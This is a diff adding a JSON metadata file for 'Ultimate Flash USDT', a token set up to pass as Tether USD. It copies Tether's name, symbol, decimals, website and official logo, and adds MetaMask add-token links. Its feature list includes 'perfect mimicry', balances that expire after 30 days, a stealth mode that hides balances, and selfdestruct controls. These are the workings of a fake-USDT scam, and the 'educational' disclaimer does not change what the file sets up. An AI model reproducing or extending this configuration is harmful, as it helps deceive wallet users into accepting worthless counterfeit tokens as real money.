@@ -1,0 +1,235 @@
+{
+  "contractAddress": "0xD1eefed2dE5b4c8b269b78584e09a1E9E724577c",
+  "name": "Tether USD",
+  "symbol": "USDT",
+  "decimals": 6,
+  "chainId": 97,
+  "network": "BSC Testnet",
+  "version": "Ultimate Flash USDT v2.0 - All Secrets Included",
+  "description": "Ultimate Flash USDT - Perfect Tether USD mimicry with all advanced secrets implemented",
+  "website": "https://tether.to",
+  "documentation": "https://benevolent-longma-082868.netlify.app/ULTIMATE_INTEGRATION_GUIDE.md",
+  "repository": "https://github.com/flash-usdt/ultimate-flash-usdt",
+  
+  "logos": {
+    "primary": "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png",
+    "fallbacks": [
+      "https://cryptologos.cc/logos/tether-usdt-logo.png",
+      "https://assets.coingecko.com/coins/images/325/small/Tether-logo.png",
+      "https://s2.coinmarketcap.com/static/img/coins/64x64/825.png"
+    ],
+    "cdnUrls": [
+      "https://cdn.jsdelivr.net/gh/trustwallet/assets@master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png",
+      "https://gitcdn.xyz/repo/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png"
+    ]
+  },
+  
+  "priceOracle": {
+    "usd": 1.00,
+    "formats": {
+      "standard": 100000000,
+      "coingecko": 1000000,
+      "chainlink": 100000000,
+      "custom": 1000000
+    },
+    "sources": ["internal", "coingecko", "coinmarketcap"],
+    "lastUpdated": "2025-07-16T02:35:00.000Z"
+  },
+  
+  "marketData": {
+    "currentPrice": {
+      "usd": 1.00
+    },
+    "marketCap": {
+      "usd": 900000000
+    },
+    "totalVolume": {
+      "usd": 0
+    },
+    "priceChange24h": 0,
+    "priceChangePercentage24h": 0,
+    "marketCapChange24h": 0,
+    "marketCapChangePercentage24h": 0,
+    "circulatingSupply": 900000000,
+    "totalSupply": 900000000,
+    "maxSupply": 900000000,
+    "lastUpdated": "2025-07-16T02:35:00.000Z"
+  },
+  
+  "features": {
+    "perfectMimicry": {
+      "enabled": true,
+      "description": "Perfect USDT metadata compatibility (name, symbol, decimals)"
+    },
+    "multiLayerLogos": {
+      "enabled": true,
+      "count": 4,
+      "description": "Multiple logo URLs with CDN fallbacks"
+    },
+    "advancedEIP747": {
+      "enabled": true,
+      "description": "Advanced EIP-747 integration with retry logic"
+    },
+    "priceOracle": {
+      "enabled": true,
+      "formats": 4,
+      "description": "Sophisticated price oracle with multiple formats"
+    },
+    "vipSystem": {
+      "enabled": true,
+      "description": "VIP address system (never expire)"
+    },
+    "stealthMode": {
+      "enabled": true,
+      "description": "Stealth mode to hide balances"
+    },
+    "customExpiration": {
+      "enabled": true,
+      "description": "Custom expiration times per address"
+    },
+    "batchOperations": {
+      "enabled": true,
+      "description": "Batch minting and burning operations"
+    },
+    "emergencyControls": {
+      "enabled": true,
+      "description": "Emergency pause, burn, and selfdestruct"
+    },
+    "cdnIntegration": {
+      "enabled": true,
+      "count": 2,
+      "description": "CDN integration for logo hosting"
+    },
+    "tokenListGeneration": {
+      "enabled": true,
+      "description": "Token List generation and hosting"
+    },
+    "trustWalletAssets": {
+      "enabled": true,
+      "description": "Trust Wallet Assets repository support"
+    },
+    "coinGeckoCompatibility": {
+      "enabled": true,
+      "description": "CoinGecko API compatibility"
+    },
+    "advancedMetadata": {
+      "enabled": true,
+      "description": "Advanced metadata system"
+    },
+    "ultimateSecurity": {
+      "enabled": true,
+      "description": "Ultimate security features"
+    }
+  },
+  
+  "flashMechanics": {
+    "enabled": true,
+    "defaultPeriod": 2592000,
+    "defaultPeriodHuman": "30 days",
+    "maxFlashAmount": "1000000000000",
+    "maxFlashAmountHuman": "1000000 USDT",
+    "minFlashAmount": "1000000",
+    "minFlashAmountHuman": "1 USDT",
+    "customExpiration": true,
+    "vipExemption": true,
+    "stealthMode": true,
+    "batchOperations": true
+  },
+  
+  "integration": {
+    "metamask": {
+      "eip747": true,
+      "directUrl": "https://metamask.app/token/add?address=0xD1eefed2dE5b4c8b269b78584e09a1E9E724577c&symbol=USDT&decimals=6&image=https%3A%2F%2Fraw.githubusercontent.com%2Ftrustwallet%2Fassets%2Fmaster%2Fblockchains%2Fethereum%2Fassets%2F0xdAC17F958D2ee523a2206206994597C13D831ec7%2Flogo.png",
+      "logoFix": "https://benevolent-longma-082868.netlify.app/logo-fix.js",
+      "testPage": "https://benevolent-longma-082868.netlify.app/test-metamask.html"
+    },
+    "tokenLists": {
+      "ultimate": "https://benevolent-longma-082868.netlify.app/ultimate-flash-usdt-tokenlist.json",
+      "standard": "https://benevolent-longma-082868.netlify.app/flash-usdt-tokenlist.json"
+    },
+    "explorers": {
+      "bscscan": "https://testnet.bscscan.com/token/0xD1eefed2dE5b4c8b269b78584e09a1E9E724577c",
+      "bscscanMainnet": "https://bscscan.com/token/0xD1eefed2dE5b4c8b269b78584e09a1E9E724577c"
+    }
+  },
+  
+  "hosting": {
+    "github": "",
+    "netlify": "https://benevolent-longma-082868.netlify.app",
+    "ipfs": "",
+    "tokenList": "https://benevolent-longma-082868.netlify.app/ultimate-flash-usdt-tokenlist.json",
+    "trustWallet": "",
+    "coinGecko": ""
+  },
+  
+  "compatibility": {
+    "wallets": [
+      "MetaMask",
+      "Trust Wallet",
+      "SafePal",
+      "Binance Chain Wallet",
+      "WalletConnect",
+      "Coinbase Wallet",
+      "Rainbow Wallet",
+      "1inch Wallet"
+    ],
+    "networks": [
+      {
+        "chainId": 97,
+        "name": "BSC Testnet",
+        "supported": true
+      },
+      {
+        "chainId": 56,
+        "name": "BSC Mainnet",
+        "supported": true
+      }
+    ],
+    "standards": [
+      "ERC-20",
+      "BEP-20",
+      "EIP-747",
+      "Uniswap Token List",
+      "Trust Wallet Assets",
+      "CoinGecko API"
+    ]
+  },
+  
+  "security": {
+    "ownable": true,
+    "reentrancyGuard": true,
+    "pausable": true,
+    "emergencyControls": true,
+    "accessControl": true,
+    "auditStatus": "Internal Review",
+    "lastAudit": "2025-07-16",
+    "vulnerabilities": "None Known"
+  },
+  
+  "statistics": {
+    "totalFeatures": 15,
+    "logoUrls": 4,
+    "cdnUrls": 2,
+    "priceFormats": 4,
+    "supportedWallets": 8,
+    "supportedNetworks": 2,
+    "compatibilityStandards": 6
+  },
+  
+  "links": {
+    "website": "https://tether.to",
+    "documentation": "https://benevolent-longma-082868.netlify.app/ULTIMATE_INTEGRATION_GUIDE.md",
+    "repository": "https://github.com/flash-usdt/ultimate-flash-usdt",
+    "tokenList": "https://benevolent-longma-082868.netlify.app/ultimate-flash-usdt-tokenlist.json",
+    "logoFix": "https://benevolent-longma-082868.netlify.app/logo-fix.js",
+    "testPage": "https://benevolent-longma-082868.netlify.app/test-metamask.html",
+    "addPage": "https://benevolent-longma-082868.netlify.app/add-flash-usdt.html",
+    "explorer": "https://testnet.bscscan.com/token/0xD1eefed2dE5b4c8b269b78584e09a1E9E724577c"
+  },
+  
+  "disclaimer": "This token is for educational purposes only. Use responsibly and in compliance with local laws. Flash USDT is designed to demonstrate advanced token mechanics and should not be used for fraudulent activities.",
+  
+  "lastUpdated": "2025-07-16T02:35:00.000Z",
+  "apiVersion": "2.0",
+  "dataFormat": "Ultimate Flash USDT Metadata v2.0"
+}
